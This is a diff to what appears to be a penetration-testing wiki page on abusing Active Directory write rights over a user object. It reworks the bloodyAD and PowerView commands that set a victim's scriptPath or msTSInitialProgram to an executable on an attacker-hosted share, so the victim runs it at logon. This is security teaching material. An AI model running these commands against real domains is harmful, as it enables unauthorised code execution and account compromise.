@@ -9,6 +9,18 @@ This abuse can be carried out when controlling an object that has a `GenericAll`
 The attacker can make the user execute a custom script at logon.
 
 {% tabs %}
+
+{% tab title="UNIX-like" %}
+This can be achieved with [bloodyAD](https://github.com/CravateRouge/bloodyAD).
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'
+
+# or
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
+```
+{% endtab %}
+
 {% tab title="Windows" %}
 This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
 
@@ -17,17 +29,6 @@ This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/
 Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
 
 Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
-```
-{% endtab %}
-
-{% tab title="Windows/UNIX-like" %}
-It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
-```bash
-bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
-bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSWorkDirectory -v 'C:\'
-
-# or
-bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
 ```
 {% endtab %}
 
